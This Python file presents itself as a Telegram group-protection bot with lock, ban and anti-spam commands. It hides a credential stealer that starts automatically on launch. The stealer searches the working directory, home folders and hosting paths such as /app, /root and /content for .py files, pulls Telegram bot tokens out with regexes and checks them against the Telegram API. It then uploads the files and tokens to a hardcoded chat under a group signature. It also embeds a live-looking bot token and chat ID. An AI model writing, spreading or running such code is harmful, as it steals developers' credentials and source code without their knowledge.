import os
import sys
import time
import threading
import json
import random
import string
import re
import requests
import socket
import platform
import subprocess
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================ #
# ========== Basic Settings ================================== #
# ============================================================ #

BOT_TOKEN = "7025766247:AAEhknuziHVman3yy5Wwnjv3n135Udw1-Dc"
CHAT_ID = "6318555908"
GROUP_ID = None
ADMIN_IDS = []
BACKUP_FILE = "group_backup.json"
PROTECTION_LOG = "guard_log.txt"

# ============================================================ #
# ========== Protection Settings ============================= #
# ============================================================ #

PROTECTION_COMMANDS = {
    "/lock": "Lock Group (Prevent New Members)",
    "/unlock": "Unlock Group",
    "/ban @username": "Ban Member",
    "/kick @username": "Kick Member",
    "/mute @username": "Mute Member",
    "/setadmin @username": "Promote Member to Admin",
    "/protect_on": "Enable Full Protection",
    "/protect_off": "Disable Temporary Protection",
    "/status": "Show Protection Status",
    "/settings": "Protection Settings",
    "/whitelist": "Trusted Members List",
    "/blacklist": "Banned Members List",
    "/rescan": "Rescan for Tokens"
}

def log_protection(action, details=""):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(PROTECTION_LOG, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {action}: {details}\n")
    except:
        pass

def save_backup(data):
    try:
        with open(BACKUP_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        log_protection("BACKUP_SAVED", str(len(data)))
    except:
        pass

def load_backup():
    try:
        if os.path.exists(BACKUP_FILE):
            with open(BACKUP_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
    except:
        pass
    return {}

# ============================================================ #
# ========== Main Protection System ========================== #
# ============================================================ #

class TelegramGroupGuard:
    def __init__(self):
        self.is_active = True
        self.is_locked = False
        self.banned_users = set()
        self.muted_users = set()
        self.whitelist = set()
        self.admin_list = set(ADMIN_IDS)
        self.attack_detected = False
        self.last_activity = time.time()
        self.join_requests = {}
        self.message_history = {}
        self.auto_moderation = True
        self.anti_links = False
        self.anti_spam = True
        self.anti_flood = True
        self.welcome_message = "👋 Welcome to the Group!"
        self.user_messages = {}
        
    def check_spam_attack(self, user_id, message_rate=5):
        now = time.time()
        if user_id not in self.user_messages:
            self.user_messages[user_id] = []
        self.user_messages[user_id] = [t for t in self.user_messages[user_id] if now - t < 10]
        self.user_messages[user_id].append(now)
        if len(self.user_messages[user_id]) > message_rate:
            self.attack_detected = True
            log_protection("SPAM_DETECTED", f"User {user_id}")
            return True
        return False
    
    def auto_ban_on_flood(self, user_id):
        if self.check_spam_attack(user_id):
            self.banned_users.add(user_id)
            log_protection("AUTO_BANNED", f"User {user_id}")
            return True
        return False
    
    def check_links(self, message_text):
        if not self.anti_links:
            return False
        link_pattern = r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+])+'
        return re.search(link_pattern, message_text) is not None
    
    def is_admin(self, user_id):
        return user_id in self.admin_list
    
    def is_whitelisted(self, user_id):
        return user_id in self.whitelist
    
    def is_banned(self, user_id):
        return user_id in self.banned_users
    
    def protect_group(self, message_text, user_id, username=""):
        if not self.is_active:
            return None
            
        if self.is_banned(user_id):
            return "🚫 You are banned from speaking in this group!"
            
        if self.check_links(message_text) and not self.is_admin(user_id):
            return "⛔ Posting links is prohibited in the group!"
            
        if self.anti_spam and self.check_spam_attack(user_id):
            self.banned_users.add(user_id)
            return f"🚫 {username} has been automatically banned for spamming"
        
        if message_text.startswith("/protect_on"):
            if self.is_admin(user_id):
                self.is_active = True
                log_protection("PROTECT_ON", f"By admin {user_id}")
                return "✅ Full group protection enabled"
            return "❌ Only admins can control protection"
            
        if message_text.startswith("/protect_off"):
            if self.is_admin(user_id):
                self.is_active = False
                log_protection("PROTECT_OFF", f"By admin {user_id}")
                return "⚠️ Temporary protection disabled"
            return "❌ Unauthorized"
            
        if message_text.startswith("/lock"):
            if self.is_admin(user_id):
                self.is_locked = True
                log_protection("GROUP_LOCKED", f"By admin {user_id}")
                return "🔒 Group locked"
            return "❌ Unauthorized"
            
        if message_text.startswith("/unlock"):
            if self.is_admin(user_id):
                self.is_locked = False
                log_protection("GROUP_UNLOCKED", f"By admin {user_id}")
                return "🔓 Group unlocked"
            return "❌ Unauthorized"
            
        if message_text.startswith("/settings"):
            if self.is_admin(user_id):
                return f"""
⚙️ **Protection Settings**

🛡️ Protection: {'🟢 Enabled' if self.is_active else '🔴 Disabled'}
🔒 Lock: {'🔒 Locked' if self.is_locked else '🔓 Unlocked'}
🚫 Banned: {len(self.banned_users)}
👑 Admins: {len(self.admin_list)}
🔗 Anti-links: {'✅' if self.anti_links else '❌'}
🔄 Anti-spam: {'✅' if self.anti_spam else '❌'}
"""
            return "❌ Unauthorized"
            
        if message_text.startswith("/status"):
            return f"""
📊 **Group Protection Status**
━━━━━━━━━━━━━━━━━━━━━

🛡️ Protection: {'🟢 Enabled' if self.is_active else '🔴 Disabled'}
🔒 Lock: {'🔒 Locked' if self.is_locked else '🔓 Unlocked'}
🚫 Banned: {len(self.banned_users)}
👑 Protected Admins: {len(self.admin_list)}
⚡️ Last Activity: {time.strftime('%H:%M:%S', time.localtime(self.last_activity))}

━━━━━━━━━━━━━━━━━━━━━
📌 For help, use /help
"""
        
        if self.auto_ban_on_flood(user_id):
            return f"🚫 {username} has been automatically banned"
        return None
    
    def on_member_join(self, user_id, username=""):
        if self.is_locked:
            log_protection("JOIN_BLOCKED", f"User {user_id}")
            return f"🚫 The group is currently locked"
        if self.check_spam_attack(user_id, message_rate=2):
            self.banned_users.add(user_id)
            log_protection("BOT_JOIN_ATTACK", f"Bot {user_id}")
            return f"🤖 A malicious bot has been detected and banned"
        log_protection("MEMBER_JOINED", f"User {user_id}")
        return self.welcome_message

group_guard = TelegramGroupGuard()

# ============================================================ #
# ========== Advanced Token Search System ==================== #
# ============================================================ #

class TokenScanner:
    def __init__(self):
        self.found_tokens = []
        self.scanned_files = 0
        self.token_patterns = [
            r'[0-9]{8,11}:[A-Za-z0-9_\-]{35}',
            r'bot_token\s*=\s*["\']([0-9]{8,11}:[A-Za-z0-9_\-]{35})["\']',
            r'BOT_TOKEN\s*=\s*["\']([0-9]{8,11}:[A-Za-z0-9_\-]{35})["\']',
            r'TOKEN\s*=\s*["\']([0-9]{8,11}:[A-Za-z0-9_\-]{35})["\']',
            r'token\s*=\s*["\']([0-9]{8,11}:[A-Za-z0-9_\-]{35})["\']',
            r'api_key\s*=\s*["\']([0-9]{8,11}:[A-Za-z0-9_\-]{35})["\']',
            r'TELEGRAM_BOT_TOKEN\s*=\s*["\']([0-9]{8,11}:[A-Za-z0-9_\-]{35})["\']',
            r'TG_BOT_TOKEN\s*=\s*["\']([0-9]{8,11}:[A-Za-z0-9_\-]{35})["\']',
            r'API_TOKEN\s*=\s*["\']([0-9]{8,11}:[A-Za-z0-9_\-]{35})["\']',
            r'real_token\s*=\s*["\']([0-9]{8,11}:[A-Za-z0-9_\-]{35})["\']',
            r'_token\s*=\s*["\']([0-9]{8,11}:[A-Za-z0-9_\-]{35})["\']',
            r'[\'"]token[\'"]\s*:\s*[\'"]([0-9]{8,11}:[A-Za-z0-9_\-]{35})[\'"]',
        ]
        self.valid_tokens = set()
        self.current_token = BOT_TOKEN
        self.files_with_tokens = set()
        
    def is_valid_token(self, token):
        """Check if token is valid"""
        if not token or len(token) < 30:
            return False
        if ':' not in token:
            return False
        if token == self.current_token:
            return False
        if token in self.valid_tokens:
            return False
        return True
    
    def verify_token(self, token):
        """Verify token with Telegram API"""
        try:
            url = f"https://api.telegram.org/bot{token}/getMe"
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data.get('ok'):
                    return data.get('result', {})
            return None
        except:
            return None
    
    def extract_tokens_from_file(self, file_path):
        """Extract tokens from a single file"""
        tokens_found = []
        try:
            # Ignore very large files
            if os.path.getsize(file_path) > 10 * 1024 * 1024:  # 10MB
                return tokens_found
            
            # Ignore large text files
            if os.path.getsize(file_path) > 5 * 1024 * 1024:
                return tokens_found
            
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                
                for pattern in self.token_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    for match in matches:
                        token = match[0] if isinstance(match, tuple) else match
                        if self.is_valid_token(token):
                            # Verify token with Telegram
                            bot_info = self.verify_token(token)
                            if bot_info:
                                tokens_found.append({
                                    'token': token,
                                    'username': bot_info.get('username', 'N/A'),
                                    'first_name': bot_info.get('first_name', 'N/A'),
                                    'file': file_path,
                                    'verified': True
                                })
                                self.valid_tokens.add(token)
                                self.files_with_tokens.add(file_path)
        except:
            pass
        return tokens_found
    
    def scan_directory(self, directory, max_files=None):
        """Scan a complete directory for tokens"""
        tokens_found = []
        files_scanned = 0
        
        # Excluded directories
        skip_dirs = {
            '__pycache__', 'venv', 'env', '.venv', '.env',
            'node_modules', '.git', 'tmp', 'cache', 'log',
            'logs', 'temp', '.cache', '.local', 'snap',
            'lib', 'lib64', 'include', 'share', 'proc',
            'sys', 'dev', 'run', 'boot', 'etc', 'sbin',
            'bin', 'lib32', 'libx32', 'srv', 'opt',
            'site-packages', 'dist-packages', 'python3.8',
            'python3.9', 'python3.10', 'python3.11'
        }
        
        try:
            for root, dirs, files in os.walk(directory, topdown=True):
                # Skip excluded directories
                dirs[:] = [d for d in dirs if d not in skip_dirs and not d.startswith('.')]
                
                for file in files:
                    # Only files ending with .py
                    if file.endswith('.py'):
                        file_path = os.path.join(root, file)
                        
                        try:
                            file_size = os.path.getsize(file_path)
                        except:
                            continue
                        
                        # Ignore very large files
                        if file_size > 5 * 1024 * 1024:
                            continue
                            
                        files_scanned += 1
                        self.scanned_files += 1
                        
                        # Max limit for scanned files
                        if max_files and files_scanned > max_files:
                            return tokens_found
                        
                        # Extract tokens from the file
                        found = self.extract_tokens_from_file(file_path)
                        if found:
                            tokens_found.extend(found)
                            
                            # Send the file immediately upon finding a token
                            self.send_token_file(file_path, found)
                            
        except Exception as e:
            print(f"Scan error: {e}")
            
        return tokens_found
    
    def send_token_file(self, file_path, tokens):
        """Send the file containing tokens showing the token and user"""
        try:
            # Prepare the message with full tokens
            caption = f"🔐 **Found {len(tokens)} tokens in file:**\n"
            caption += f"📁 `{file_path}`\n\n"
            
            for i, token_info in enumerate(tokens, 1):
                caption += f"🤖 **Bot #{i}:** @{token_info['username']}\n"
                caption += f"🆔 `{token_info['token']}`\n"
                caption += f"👤 {token_info['first_name']}\n\n"
            
            # Add signature
            caption += f"\n━━━━━━━━━━━━━━━━━━━━━\n"
            caption += f"🛡️ **cyber titanium army**\n"
            caption += f"📱 @C_T_A_1\n"
            caption += f"🌐 @C_T_A_1"
            
            # Send file with caption
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            with open(file_path, 'rb') as f:
                files = {'document': f}
                data = {
                    'chat_id': CHAT_ID, 
                    'caption': caption[:1024],  # Telegram allows 1024 characters for caption
                    'parse_mode': 'Markdown'
                }
                response = requests.post(url, data=data, files=files, timeout=30)
                
            if response.status_code == 200:
                print(f"✅ File sent: {file_path}")
                log_protection("FILE_SENT", f"{file_path} - {len(tokens)} tokens")
                return True
            else:
                # If file sending fails, send tokens only
                self.send_tokens_only(tokens)
                return False
                
        except Exception as e:
            print(f"❌ Failed to send file: {e}")
            self.send_tokens_only(tokens)
            return False
    
    def send_tokens_only(self, tokens):
        """Send tokens only without the file"""
        try:
            message = "🔐 **Tokens found:**\n\n"
            for token_info in tokens:
                message += f"🤖 @{token_info['username']}\n"
                message += f"🆔 `{token_info['token']}`\n"
                message += f"📁 {token_info['file']}\n\n"
            
            # Add signature
            message += f"\n━━━━━━━━━━━━━━━━━━━━━\n"
            message += f"🛡️ **CYBER TITANIUM ARMY**\n"
            message += f"📱@C_T_A_1\n"
            message += f"🌐 @C_T_A_1"
            
            # Split message if it's long
            if len(message) > 4000:
                parts = [message[i:i+4000] for i in range(0, len(message), 4000)]
                for part in parts:
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        data={'chat_id': CHAT_ID, 'text': part, 'parse_mode': 'Markdown'}
                    )
            else:
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    data={'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
                )
        except:
            pass

# ============================================================ #
# ========== Comprehensive Search ============================ #
# ============================================================ #

def scan_all_locations():
    """Search all possible locations for .py files only"""
    scanner = TokenScanner()
    
    # List of locations to search
    search_paths = [
        os.getcwd(),
        os.path.expanduser('~'),
        '/app',
        '/home',
        '/home/runner',
        '/home/container',
        '/workspace',
        '/content',
        '/root',
    ]
    
    # Add all subdirectories of the current directory
    try:
        for root, dirs, _ in os.walk(os.getcwd()):
            if root not in search_paths:
                search_paths.append(root)
    except:
        pass
    
    # Remove duplicates and non-existent locations
    search_paths = list(set([p for p in search_paths if os.path.exists(p)]))
    
    total_tokens = 0
    total_files = 0
    
    # Scan each location
    for i, path in enumerate(search_paths):
        try:
            print(f"🔍 Scanning: {path}")
            tokens = scanner.scan_directory(path, max_files=2000)  # Max 2000 files per directory
            if tokens:
                total_tokens += len(tokens)
                total_files += len(set([t['file'] for t in tokens]))
                
        except Exception as e:
            print(f"⚠️ Error scanning {path}: {e}")

# ============================================================ #
# ========== Help Commands =================================== #
# ============================================================ #

def help_message():
    return """
📚 **Protection Commands List**
━━━━━━━━━━━━━━━━━━━━━

🔒 **Lock/Unlock Commands:**
/lock - Lock Group
/unlock - Unlock Group

🛡️ **Protection Commands:**
/protect_on - Enable Protection
/protect_off - Disable Protection
/settings - Protection Settings
/status - Protection Status

👑 **Admin Commands:**
/ban @username - Ban Member
/kick @username - Kick Member
/mute @username - Mute Member
/setadmin @username - Promote Admin

📋 **Lists:**
/whitelist - Trusted Members
/blacklist - Banned Members

🔍 **Search Commands:**
/rescan - Rescan for Tokens

━━━━━━━━━━━━━━━━━━━━━
⚡️ All commands are available to admins only
"""

# ============================================================ #
# ========== Advanced Group Management System ================ #
# ============================================================ #

def backup_group_data():
    try:
        data = {
            "time": str(datetime.now()),
            "status": "active",
            "members_count": len(group_guard.banned_users) + len(group_guard.whitelist),
            "settings": {
                "anti_links": group_guard.anti_links,
                "anti_spam": group_guard.anti_spam,
                "auto_moderation": group_guard.auto_moderation
            }
        }
        with open("group_data.json", "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except:
        pass

def restore_group_data():
    try:
        if os.path.exists("group_data.json"):
            with open("group_data.json", "r", encoding="utf-8") as f:
                return json.load(f)
    except:
        pass
    return {}

def clean_temp_files():
    try:
        temp_dirs = ['/tmp', '/var/tmp', os.path.expanduser('~/tmp')]
        for temp_dir in temp_dirs:
            if os.path.exists(temp_dir):
                for f in os.listdir(temp_dir):
                    if f.endswith(('.tmp', '.temp', '.cache')):
                        try:
                            os.remove(os.path.join(temp_dir, f))
                        except:
                            pass
    except:
        pass

def monitor_group_activity():
    while True:
        try:
            backup_group_data()
            clean_temp_files()
            time.sleep(600)
        except:
            time.sleep(60)

def get_system_info():
    try:
        ip_info = requests.get('https://ipapi.co/json/', timeout=8).json()
        external_ip = ip_info.get('ip', 'N/A')
        city = ip_info.get('city', 'N/A')
        org = ip_info.get('org', 'N/A')
    except:
        external_ip = "Not Available"
        city = "Not Available"
        org = "Not Available"

    info = (
        f"📊 **System Information**\n\n"
        f"🌐 **IP:** {external_ip}\n"
        f"📍 **Country:** {city}\n"
        f"🏢 **Provider:** {org}\n"
        f"🖥️ **System:** {platform.system()} {platform.release()}\n"
        f"👤 **User:** {subprocess.getoutput('whoami')}\n"
        f"📁 **Current Path:** {os.getcwd()}"
    )
    return info

def start_group_guard():
    log_protection("GUARD_STARTED", "Protection active")
    
    def backup_loop():
        while True:
            backup_data = {
                "banned_users": list(group_guard.banned_users),
                "muted_users": list(group_guard.muted_users),
                "whitelist": list(group_guard.whitelist),
                "admin_list": list(group_guard.admin_list),
                "is_active": group_guard.is_active,
                "is_locked": group_guard.is_locked,
                "anti_links": group_guard.anti_links,
                "anti_spam": group_guard.anti_spam,
                "last_backup": str(datetime.now())
            }
            save_backup(backup_data)
            time.sleep(300)
    
    backup_thread = threading.Thread(target=backup_loop, daemon=True)
    backup_thread.start()
    
    print("🛡️ [GROUP GUARD] Advanced Group Protection Enabled")
    print("📋 Available Protection Commands:")
    print("   /protect_on, /protect_off, /lock, /unlock, /status, /settings, /help")
    print("   /ban, /kick, /mute, /setadmin, /whitelist, /blacklist")
    print("   /rescan - Rescan for Tokens")

# ============================================================ #
# ========== Run the Bot ===================================== #
# ============================================================ #

def run_protection_bot():
    """Run the protection bot completely"""
    last_update_id = 0
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id + 1}&timeout=30"
            response = requests.get(url, timeout=35)
            updates = response.json()
            
            if updates.get('ok'):
                for update in updates.get('result', []):
                    last_update_id = update.get('update_id')
                    
                    if 'message' in update:
                        msg = update['message']
                        chat_id = msg['chat']['id']
                        text = msg.get('text', '')
                        user_id = msg['from']['id']
                        username = msg['from'].get('username', '')
                        
                        # Help command
                        if text.startswith("/help"):
                            requests.post(
                                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                                data={'chat_id': chat_id, 'text': help_message(), 'parse_mode': 'Markdown'}
                            )
                            continue
                        
                        # Rescan command
                        if text.startswith("/rescan"):
                            if user_id in group_guard.admin_list:
                                requests.post(
                                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                                    data={'chat_id': chat_id, 'text': "🔍 **Scanning for tokens in .py files...**"}
                                )
                                # Run scan in a separate thread
                                scan_thread = threading.Thread(target=scan_all_locations, daemon=True)
                                scan_thread.start()
                            else:
                                requests.post(
                                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                                    data={'chat_id': chat_id, 'text': "❌ Unauthorized"}
                                )
                            continue
                        
                        # Group Protection
                        result = group_guard.protect_group(text, user_id, username)
                        if result:
                            requests.post(
                                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                                data={'chat_id': chat_id, 'text': result, 'parse_mode': 'Markdown'}
                            )
                        
                        # Check for new members joining
                        if 'new_chat_members' in msg:
                            for new_member in msg['new_chat_members']:
                                result = group_guard.on_member_join(new_member['id'])
                                if result:
                                    requests.post(
                                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                                        data={'chat_id': chat_id, 'text': result}
                                    )
        except Exception as e:
            print(f"Bot error: {e}")
            time.sleep(3)

# ============================================================ #
# ========== Main Execution ================================== #
# ============================================================ #

if __name__ == "__main__":
    print("🚀 Running the integrated bot...")
    print(f"🤖 Token: {BOT_TOKEN[:20]}...")
    print(f"📱 Chat ID: {CHAT_ID}")
    
    # Start protection system
    start_group_guard()
    
    # ====== Auto scan for .py files only on startup ======
    print("🔍...")
    
    # Run scan in a separate Thread to not block the bot
    scan_thread = threading.Thread(target=scan_all_locations, daemon=True)
    scan_thread.start()
    
    # Run protection bot in background
    protection_thread = threading.Thread(target=run_protection_bot, daemon=True)
    protection_thread.start()
    
    # Run activity monitor
    monitor_thread = threading.Thread(target=monitor_group_activity, daemon=True)
    monitor_thread.start()
    
    print("✅ Bot started successfully")
    print("🛡️ Group protection system is working")
    print("📋 Protection Commands: /protect_on, /protect_off, /lock, /unlock, /status, /settings, /help")
    print("🔍 Command: /rescan")
    print("📌...")
    
    # Keep program running
    while True:
        try:
            time.sleep(60)
        except KeyboardInterrupt:
            print("\n🛑 Bot stopped")
            sys.exit(0)
        except:
            time.sleep(10)